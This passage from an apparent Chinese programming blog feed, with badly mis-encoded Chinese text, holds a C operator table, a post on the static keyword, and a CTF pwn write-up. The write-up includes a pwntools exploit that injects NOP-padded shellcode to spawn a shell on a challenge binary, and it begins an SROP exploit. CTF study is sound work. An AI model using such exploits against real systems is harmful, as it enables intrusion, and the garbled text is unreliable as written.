‡å¼•ç”¨</td><td>rexp[rexp]</td><td>lexp</td><td>L-R</td><td>å¦</td></tr><tr><td>.</td><td>è®¿é—®ç»“æ„æˆå‘˜</td><td>lexp.member_name</td><td>lexp</td><td>L-R</td><td>å¦</td></tr><tr><td>-&gt;</td><td>è®¿é—®ç»“æ„æŒ‡é’ˆæˆå‘˜</td><td>rexp-&gt;member_name</td><td>lexp</td><td>L-R</td><td>å¦</td></tr><tr><td>++</td><td>åç¼€è‡ªå¢</td><td>lexp ++</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>â€“</td><td>åç¼€è‡ªå‡</td><td>lexp â€“</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>!</td><td>é€»è¾‘å</td><td>! rexp</td><td>rexp</td><td>R-Lï¼ˆå³åˆ°å·¦ï¼‰</td><td>å¦</td></tr><tr><td>~</td><td>æŒ‰ä½å–å</td><td>~ rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>+</td><td>å•ç›®ï¼Œè¡¨ç¤ºæ­£å€¼</td><td>+ rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>-</td><td>å•ç›®ï¼Œè¡¨ç¤ºè´Ÿå€¼</td><td>- rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>++</td><td>å‰ç¼€è‡ªå¢</td><td>++ lexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>â€“</td><td>å‰ç¼€è‡ªå‡</td><td>â€“ lexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>*</td><td>é—´æ¥è®¿é—®</td><td>* rexp</td><td>lexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&amp;</td><td>å–åœ°å€</td><td>&amp; lexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>sizeof</td><td>å–å…¶é•¿åº¦ï¼Œä»¥å­—èŠ‚ è¡¨ç¤º</td><td>sizeof rexp sizeof(ç±» å‹)</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>(ç±» å‹ï¼‰</td><td>ç±»å‹è½¬æ¢</td><td>(ç±»å‹) rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>*</td><td>ä¹˜æ³•</td><td>rexp * rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&#x2F;</td><td>é™¤æ³•</td><td>rexp &#x2F; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>%</td><td>æ•´æ•°å–ä½™</td><td>rexp % rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>+</td><td>åŠ æ³•</td><td>rexp + rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>-</td><td>å‡æ³•</td><td>rexp - rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&lt;&lt;</td><td>å·¦ç§»ä½</td><td>rexp &lt;&lt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&gt;&gt;</td><td>å³ç§»ä½</td><td>rexp &gt;&gt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&gt;</td><td>å¤§äº</td><td>rexp &gt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&gt;&#x3D;</td><td>å¤§äºç­‰äº</td><td>rexp &gt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&lt;</td><td>å°äº</td><td>rexp &lt; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&lt;&#x3D;</td><td>å°äºç­‰äº</td><td>rexp &lt;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&#x3D;&#x3D;</td><td>ç­‰äº</td><td>rexp &#x3D;&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>!&#x3D;</td><td>ä¸ç­‰äº</td><td>rexp !&#x3D; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&amp;</td><td>ä½ä¸</td><td>rexp &amp; rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>^</td><td>ä½å¼‚æˆ–</td><td>rexp ^ rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>|</td><td>ä½æˆ–</td><td>rexp | rexp</td><td>rexp</td><td>L-R</td><td>å¦</td></tr><tr><td>&amp;&amp;</td><td>é€»è¾‘ä¸</td><td>rexp &amp;&amp; rexp</td><td>rexp</td><td>L-R</td><td>æ˜¯</td></tr><tr><td>||</td><td>é€»è¾‘æˆ–</td><td>rexp || rexp</td><td>rexp</td><td>L-R</td><td>æ˜¯</td></tr><tr><td>? :</td><td>æ¡ä»¶æ“ä½œç¬¦</td><td>rexp ? rexp : rexp</td><td>rexp</td><td>N&#x2F;A</td><td>æ˜¯</td></tr><tr><td>&#x3D;</td><td>èµ‹å€¼</td><td>lexp &#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>+&#x3D;</td><td>ä»¥â€¦åŠ </td><td>lexp +&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>-&#x3D;</td><td>ä»¥â€¦å‡</td><td>lexp -&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>*&#x3D;</td><td>ä»¥â€¦ä¹˜</td><td>lexp *&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&#x2F;&#x3D;</td><td>ä»¥â€¦é™¤</td><td>lexp &#x2F;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>%&#x3D;</td><td>ä»¥â€¦å–æ¨¡</td><td>lexp %&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&lt;&lt;&#x3D;</td><td>ä»¥â€¦å·¦ç§»</td><td>lexp &lt;&lt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&gt;&gt;&#x3D;</td><td>ä»¥â€¦å³ç§»</td><td>lexp &gt;&gt;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>&amp;&#x3D;</td><td>ä»¥â€¦ä¸</td><td>lexp &amp;&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>^&#x3D;</td><td>ä»¥â€¦å¼‚æˆ–</td><td>lexp ^&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>|&#x3D;</td><td>ä»¥â€¦æˆ–</td><td>lexp |&#x3D; rexp</td><td>rexp</td><td>R-L</td><td>å¦</td></tr><tr><td>ï¼Œ</td><td>é€—å·</td><td>rexpï¼Œrexp</td><td>rexp</td><td>L-R</td><td>æ˜¯</td></tr></tbody></table><p>ç®€å•è®°å°±æ˜¯:!&gt;ç®—æœ¯è¿ç®—ç¬¦&gt;å…³ç³»è¿ç®—ç¬¦ç¬¦&gt;&amp;&amp;&gt;||&gt;èµ‹å€¼è¿ç®—ç¬¦</p>]]></content>
      
      
      <categories>
          
          <category> Cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cè¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cæ¢ç´¢ç¢ç‰‡â€”â€”å…³é”®å­—staticä½œç”¨</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸€ã€ç®€è¿°"><a href="#ä¸€ã€ç®€è¿°" class="headerlink" title="ä¸€ã€ç®€è¿°"></a>ä¸€ã€ç®€è¿°</h2><p>staticæ„è¯‘æ˜¯é™æ€çš„ï¼Œè€Œä½œä¸ºCè¯­è¨€ä¸­å¸¸è§çš„å…³é”®å­—ä¹‹ä¸€ï¼Œå®ƒçš„ç”¨æ³•ä¹Ÿè´´åˆ‡â€œé™æ€â€è¿™ä¸€å«ä¹‰ã€‚</p><h2 id="äºŒã€ç”¨æ³•"><a href="#äºŒã€ç”¨æ³•" class="headerlink" title="äºŒã€ç”¨æ³•"></a>äºŒã€ç”¨æ³•</h2><ol><li><ul><li><strong>ä¿®é¥°å±€éƒ¨å˜é‡</strong></li></ul></li></ol><p>ä¸‹ä¸ºstaticæ˜¯å¦ä¿®é¥°å±€éƒ¨å˜é‡å¯¹ç¨‹åºè¿è¡Œç»“æœå½±å“çš„å¯¹æ¯”ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        play();</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cb3a80ccb2c62eeceb98bffabadbb269.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>æ­¤ä¸ºä¸Šå›¾staticæœªä¿®é¥°å±€éƒ¨å˜é‡çš„è¿è¡Œç»“æœ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        play();</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4b420992488352dce723db40cb016674.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>æ­¤ä¸ºstaticä¿®é¥°å±€éƒ¨å˜é‡çš„è¿è¡Œç»“æœ</p><p>ç”±ä¸Šè¿°çš„å¯¹æ¯”è§‚å¯Ÿå¯å¾—ï¼šstaticä¿®é¥°å±€éƒ¨å˜é‡æ—¶æ”¹å˜äº†è¢«ä¿®é¥°ï¼ˆé™æ€å±€éƒ¨ï¼‰å˜é‡çš„ç”Ÿå‘½å‘¨æœŸã€‚</p><p>æˆ‘ä»¬çŸ¥é“å±€éƒ¨å˜é‡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯è¿›ä½œç”¨åŸŸå¼€å§‹ï¼Œå‡ºä½œç”¨åŸŸç»“æŸï¼Œè€Œå…¶ä½œç”¨åŸŸæ˜¯å˜é‡æ‰€åœ¨çš„å±€éƒ¨èŒƒå›´ã€‚æ·±å…¥å‰–ææ¥è¯´ï¼Œstaticä¿®é¥°å±€éƒ¨å˜é‡æ—¶æ”¹å˜äº†å˜é‡çš„å­˜å‚¨ç±»å‹ã€‚å°†æœ¬æ¥å­˜å‚¨åœ¨æ ˆåŒºçš„å±€éƒ¨å˜é‡å­˜æ”¾åœ¨äº†é™æ€åŒºã€‚å­˜å‚¨ç±»å‹çš„æ”¹å˜ä½¿å¾—å…¶ç”Ÿå‘½å‘¨æœŸå˜é•¿ï¼Œä½†å¹¶ä¸å½±å“å˜é‡çš„ä½œç”¨åŸŸã€‚</p><h4 id="2-ä¿®é¥°å…¨å±€å˜é‡"><a href="#2-ä¿®é¥°å…¨å±€å˜é‡" class="headerlink" title="2.ä¿®é¥°å…¨å±€å˜é‡"></a>2.ä¿®é¥°å…¨å±€å˜é‡</h4><p>ä¸‹ä¸ºstaticæ˜¯å¦ä¿®é¥°å…¨å±€å˜é‡å¯¹ç¨‹åºè¿è¡Œç»“æœå½±å“çš„å¯¹æ¯”ã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8b3d989de9c69ddbf491862d2066dc0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><blockquote><p>ç”¨externå£°æ˜å¤–éƒ¨ç¬¦å·ä½¿å¾—åœ¨ä¸¤ä¸ªæ–‡ä»¶ä¸­å¯ä»¥è¾¾åˆ°â€œä¸€æ¬¡å®šä¹‰ï¼Œå¤šæ¬¡å£°æ˜â€çš„æ•ˆæœã€‚<br> æ³¨æ„ï¼šexternåªèƒ½ç”¨æ¥å£°æ˜å…¨å±€å˜é‡ï¼</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/1215a0c458837f0883569331440183c5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>å½“ç”¨staticä¿®é¥°å…¨å±€å˜é‡åï¼Œç¨‹åºæŠ¥é”™æ— æ³•è¿è¡Œã€‚</p><p>å·²çŸ¥å…¨å±€å˜é‡å…·æœ‰å¤–éƒ¨é“¾æ¥å±æ€§ï¼Œä¸Šå›¾å¯¹æ¯”åˆ†æå¾—ï¼šstaticä¿®é¥°å…¨å±€å˜é‡ä¹‹åå°†å…¶ï¼ˆé™æ€å…¨å±€å˜é‡ï¼‰å¤–éƒ¨é“¾æ¥å±æ€§å˜æˆäº†å†…éƒ¨é“¾æ¥å±æ€§ã€‚æ­¤æ—¶çš„å…¨å±€å˜é‡åªèƒ½åœ¨è‡ªå·±æ‰€åœ¨çš„.Cæ–‡ä»¶ä¸­ä½¿ç”¨ï¼Œå¯¹å…¶ä»–æ–‡ä»¶æ— æ³•é“¾æ¥ä½¿ç”¨ã€‚å³staticå¯¹å…¨å±€å˜é‡è¿›è¡Œä¿®é¥°æ”¹å˜äº†å…¶ä½œç”¨åŸŸçš„èŒƒå›´ï¼Œç”±åŸæ¥çš„æ•´ä¸ªå·¥ç¨‹å¯è§å˜ä¸ºæœ¬æºæ–‡ä»¶å¯è§ã€‚</p><h4 id="3-ä¿®é¥°å‡½æ•°"><a href="#3-ä¿®é¥°å‡½æ•°" class="headerlink" title="3.ä¿®é¥°å‡½æ•°"></a>3.ä¿®é¥°å‡½æ•°</h4><p>ä¸‹ä¸ºstaticæ˜¯å¦ä¿®é¥°å…¨å±€å˜é‡å¯¹ç¨‹åºè¿è¡Œç»“æœå½±å“çš„å¯¹æ¯”ã€‚</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a2a0dd86fadcd5cc30ec0d88437f5fae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e00d77cdfa029bdbe513811525802465.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>æ­¤ä¸ºä¸ºè¢«staticä¿®é¥°æ—¶ç¨‹åºè¿è¡Œç»“æœ</p><p><img src="https://img-blog.csdnimg.cn/img_convert/436508929245bdfd15f062208af6e666.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><p>ç¨‹åºæŠ¥é”™ æ— æ³•è¿è¡Œ</p><p>å‡½æ•°ä¹Ÿå…·æœ‰å¤–éƒ¨é“¾æ¥å±æ€§ï¼Œç”±ä¸Šåˆ†æå¯å¾—ç›¸åŒç»“è®ºï¼šstaticä¿®é¥°å‡½æ•°ï¼ˆé™æ€å‡½æ•°ï¼‰åå°†å…¶å¤–éƒ¨é“¾æ¥å±æ€§å˜ä¸ºå†…éƒ¨é“¾æ¥å±æ€§ï¼Œæ— æ³•é“¾æ¥ä½¿ç”¨ï¼Œåªå¯åœ¨è‡ªå·±æ‰€åœ¨.cæ–‡ä»¶ä¸­ä½¿ç”¨ã€‚</p><h4 id="ä¸‰ã€æ€»ç»“"><a href="#ä¸‰ã€æ€»ç»“" class="headerlink" title="ä¸‰ã€æ€»ç»“"></a>ä¸‰ã€æ€»ç»“</h4><p>staticä¿®é¥°å±€éƒ¨å˜é‡æ—¶å°†å…¶ç”Ÿå‘½å‘¨æœŸå»¶é•¿ä½†ä½œç”¨åŸŸæœªå‘ç”Ÿæ”¹å˜ã€‚</p><p>staticä¿®é¥°å…¨å±€å˜é‡å’Œå‡½æ•°æ—¶å°†å…¶å¤–éƒ¨é“¾æ¥å±æ€§å˜ä¸ºå†…éƒ¨é“¾æ¥å±æ€§ï¼Œä½¿å…¶åªèƒ½åœ¨æ‰€åœ¨æ–‡ä»¶ä¸­ä½¿ç”¨ã€‚</p><h4 id="å››ã€è¡¥å……"><a href="#å››ã€è¡¥å……" class="headerlink" title="å››ã€è¡¥å……"></a>å››ã€è¡¥å……</h4><p>ä»¥ä¸‹å†…å®¹åªä¸ºç®€å•æåˆ°ï¼Œåç»­å­¦ä¹ è¿‡ç¨‹ä¸­ä¼šä¸“é—¨åšåˆ†äº«æ¢è®¨ã€‚</p><h5 id="1-æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº"><a href="#1-æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº" class="headerlink" title="1.æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº"></a>1.æœ‰å…³Cè¯­è¨€å†…å­˜åˆ†åŒº</h5><p><img src="https://img-blog.csdnimg.cn/img_convert/b90c659e4affce80d1838890434a951f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨">ç¼–è¾‘</p><h5 id="2-æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§"><a href="#2-æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§" class="headerlink" title="2.æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§"></a>2.æœ‰å…³Cè¯­è¨€ä¸‰ç§é“¾æ¥å±æ€§</h5><p>é“¾æ¥å±æ€§ï¼ˆlinkageï¼‰åˆ†ä¸ºä¸‰ç§â€”â€”å¤–éƒ¨ï¼ˆexternalï¼‰ã€å†…éƒ¨ï¼ˆinternalï¼‰ã€æ— ï¼ˆnoneï¼‰ã€‚</p><p>æ³¨æ„ï¼š*é“¾æ¥å±æ€§çš„æ”¹å˜ä¸ä¼šæ”¹å˜ä½œç”¨åŸŸã€‚</p><p>*é“¾æ¥å±æ€§æ„å‘³ç€èƒ½ä¸èƒ½è®¿é—®å˜é‡åŠèƒ½ä¸èƒ½åœ¨æ–‡ä»¶ä¸­å®šä¹‰åŒåå˜é‡æˆ–å‡½æ•°åã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Cè¯­è¨€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cè¯­è¨€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éƒ¨åˆ†PWNé¢˜ç›®è®°å½•</title>
      <link href="/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/09/01/Pwn%E9%A2%98%E7%9B%AE%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwné¢˜ç›®è®°å½•"><a href="#Pwné¢˜ç›®è®°å½•" class="headerlink" title="Pwné¢˜ç›®è®°å½•"></a><strong>Pwné¢˜ç›®è®°å½•</strong></h3><h3 id="ã€NKCTFã€‘"><a href="#ã€NKCTFã€‘" class="headerlink" title="ã€NKCTFã€‘"></a>ã€NKCTFã€‘</h3><p>å¼±å°å¯æ€œæ— åŠ©çš„å”¯ä¸€ã€‚<br>ï¼ˆ1ï¼‰checkesec å‘ç°ä¸º64ä½ åªæœ‰NXä¿æŠ¤<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530231132244.png" alt="image-20230530231132244"></p><p>ï¼ˆ2ï¼‰è¿›IDAåˆ†æ </p><p>  F5æŸ¥çœ‹mainå‡½æ•°<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234240598.png"></p><p>  æŸ¥çœ‹åç§»ä¸º0x74ï¼ˆbuf[108]+8[ebpå¤§å°]ï¼‰ buf2å¤§å°éšæœº  æ— åé—¨å‡½æ•° æ­¤æ—¶è”æƒ³åˆ°ä½¿ç”¨pwntoolsç”Ÿæˆå¯åˆ©ç”¨çš„shellcode   v6éšæœºæ‰§è¡Œä½†æœªè®¾ç½®éšæœºæ•°ç§å­ã€æ³¨é‡Šæ‰“æ¼äº†ğŸ˜œã€‘</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530234339502.png" alt="image-20230530234339502"><br>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;, 1337)</span></span><br><span class="line">buf = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">108</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">payload = buf + <span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">104</span>-<span class="built_in">len</span>(shellcode)) +shellcode</span><br><span class="line">log.success(<span class="string">&quot;shellcode_len : &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é€‰æ‹©ç”¨\x90ï¼ˆnopï¼‰è¿›è¡Œå¡«å……ä½¿å¾—æ”»å‡»ä»£ç æ›´å…·ç¨³å®šæ€§<br>104å‡å»shellcodeé•¿åº¦çš„bâ€™\x90â€™å­—èŠ‚ï¼Œè¿™ä¸ªéƒ¨åˆ†ä½œç”¨æ˜¯å°†shellcodeæŒªåˆ°æœ€åï¼ˆshellcodeå¯èƒ½åœ¨ä¸­é—´ç”Ÿæˆï¼‰ï¼Œå¦‚æœæ²¡æœ‰nopsledçš„å¡«å……ï¼Œåé¢çš„æ•°æ®ä¼šè¦†ç›–å‰é¢çš„shellcodeï¼Œä»è€Œå¯¼è‡´æ”»å‡»å¤±è´¥ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™éƒ¨åˆ†çš„å¡«å……æ˜¯ä¸ºäº†è®©Shellcodeä¸ä¼šè¢«åé¢çš„æ•°æ®è¦†ç›–ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531002410442.png" alt="image-20230531002410442"></p><p>ç»Ÿç»Ÿé€š</p><h3 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a><strong>ez_stack</strong></h3><p>(1)checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150721336.png" alt="image-20230531150721336"></p><p>å‘ç°NXæ‰“å¼€ å‡†å¤‡è¿›IDAæ‰¾æº¢å‡º</p><p>ï¼ˆ2ï¼‰è¿›IDA<br>  <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531150942976.png" alt="image-20230531150942976"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531151017632.png" alt="image-20230531151017632"></p><p>â€‹       å‘ç°æº¢å‡ºéƒ¨åˆ† æ— â€&#x2F;bin&#x2F;shâ€ éœ€è¦æˆ‘ä»¬æ„é€ ropé“¾è‡ªè¡Œå†™å…¥<br>â€‹       å¸¸è§„æ€è·¯å°±æ˜¯ç¬¬ä¸€æ¬¡ropå¾€<a href="https://so.csdn.net/so/search?q=bss&spm=1001.2101.3001.7020">bss</a>ä¸Šå†™&#x2F;bin&#x2F;shï¼Œç„¶åç¬¬äºŒæ¬¡è°ƒç”¨execve<br>â€‹       ä½†ç¨‹åºæœ¬èº«æ²¡æœ‰æœ¬åœ°ç›´æ¥è°ƒç”¨å‡½æ•°-&gt;é€šè¿‡syscallæ¥å¾—åˆ°shell<br>â€‹       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531170223533.png" alt="image-20230531170223533"></p><p> æŸ¥çœ‹å‘ç°ä¸ºSROP  åœ¨.dataæ®µæ‰¾åˆ°å¯å†™å…¥&#x2F;bin&#x2F;shçš„åœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531160459228.png" alt="image-20230531160459228"> </p><p>æ‰§è¡Œå®Œ read çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ­¤æ—¶ rax &#x3D;&#x3D; 0  åˆ©ç”¨SROP ã€åªç”¨äºå¯å†™æ–¹æ³•å†…ã€‘<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230531171529997.png" alt="image-20230531171529997"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 